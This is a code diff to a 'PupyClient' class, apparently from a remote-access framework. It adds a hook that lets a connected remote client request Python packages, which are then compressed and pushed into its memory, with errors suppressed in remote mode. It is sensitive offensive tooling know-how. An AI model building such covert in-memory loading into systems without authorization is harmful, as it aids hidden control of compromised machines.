@@ -179,6 +179,10 @@ class PupyClient(object):
                 """))
             self.conn.namespace["pupyimporter_preimporter"](pupyimporter_code)
 
+        pupyimporter = self.conn.modules.pupyimporter
+        pupyimporter.register_package_request_hook(self.remote_load_package)
+        self.conn._conn.root.register_cleanup(pupyimporter.unregister_package_request_hook)
+
     def load_dll(self, path):
         """
             load some dll from memory like sqlite3.dll needed for some .pyd to work
@@ -233,6 +237,9 @@ class PupyClient(object):
                     else:
                         raise PupyModuleError("Unknown package loading method %s"%t)
         return self._load_package(module_name, force)
+
+    def remote_load_package(self, module_name):
+        return self._load_package(module_name, force=False, remote=True)
 
     def _get_module_dic(self, search_path, start_path, pure_python_only=False):
         modules_dic = {}
@@ -319,7 +326,7 @@ class PupyClient(object):
 
         return modules_dic
 
-    def _load_package(self, module_name, force=False):
+    def _load_package(self, module_name, force=False, remote=False):
         """
             load a python module into memory depending on what OS the client is.
             This function can load all types of modules in memory for windows both x86 and amd64 including .pyd C extensions
@@ -328,15 +335,16 @@ class PupyClient(object):
         # start path should only use "/" as separator
 
         update = False
-
         pupyimporter = self.conn.modules.pupyimporter
+        inital_module_name = module_name
 
-        if pupyimporter.has_module(module_name):
-            if not force:
-                return
-            else:
-                update = True
-                pupyimporter.invalidate_module(module_name)
+        if not remote:
+            if pupyimporter.has_module(module_name):
+                if not force:
+                    return
+                else:
+                    update = True
+                    pupyimporter.invalidate_module(module_name)
 
         start_path=module_name.replace(".", "/")
         package_found=False
@@ -348,7 +356,12 @@ class PupyClient(object):
                     package_path=search_path
                     break
             except Exception as e:
-                raise PupyModuleError("Error while loading package %s : %s"%(module_name, traceback.format_exc()))
+                if remote:
+                    return
+                else:
+                    raise PupyModuleError(
+                        "Error while loading package {}: {}".format(
+                            module_name, traceback.format_exc()))
 
         if not modules_dic and self.arch:
             arch_bundle = os.path.join(
@@ -428,12 +441,16 @@ class PupyClient(object):
 
                             modules_dic[module_name] = bundle.read(info.filename)
 
-        if not modules_dic: # in last resort, attempt to load the package from the server's sys.path if it exists
+        # in last resort, attempt to load the package from the server's sys.path if it exists
+        if not modules_dic and not remote:
             for search_path in sys.path:
                 try:
-                    modules_dic=self._get_module_dic(search_path, start_path, pure_python_only=True)
+                    modules_dic = self._get_module_dic(
+                        search_path, start_path, pure_python_only=True
+                    )
+
                     if modules_dic:
-                        logging.info("package %s not found in packages/, but found in local sys.path, attempting to push it remotely..."%module_name)
+                        logging.info("package %s not found in packages/, but found in local sys.path, attempting to push it remotely..." % module_name)
                         package_path=search_path
                         break
 
@@ -441,27 +458,31 @@ class PupyClient(object):
                     logging.warning(e)
 
                 except Exception as e:
-                    raise PupyModuleError("Error while loading package from sys.path %s : %s"%(module_name, traceback.format_exc()))
+                    if remote:
+                        return
+                    else:
+                        raise PupyModuleError(
+                            "Error while loading package from sys.path {}: {}".format(
+                                module_name, traceback.format_exc()))
 
         if not modules_dic:
-            if self.desc['native']:
-                raise PupyModuleError("Couldn't find package {} in \(path={}) and sys.path / native".format(
-                    module_name, repr(self.get_packages_path())))
+            if remote:
+                return
             else:
-                try:
-                    pupyimporter.native_import(module_name)
-                except Exception as e:
-                    raise PupyModuleError("Couldn't find package {} in \(path={}) and sys.path / python = {}".format(
-                        module_name, repr(self.get_packages_path()), e))
+                raise PupyModuleError("Couldn't find package: {}".format(module_name))
 
         # we have to pickle the dic for two reasons : because the remote side is
         # not aut0horized to iterate/access to the dictionary declared on this
         # side and because it is more efficient
         pupyimporter.pupy_add_package(
             zlib.compress(cPickle.dumps(modules_dic), 9),
-            compressed=True
+            compressed=True,
+            # Use None to prevent import-then-clean-then-search behavior
+            name=(None if remote else inital_module_name)
         )
+
         logging.debug("package %s loaded on %s from path=%s"%(module_name, self.short_name(), package_path))
+
         if update:
             self.conn.modules.__invalidate__(module_name)
 
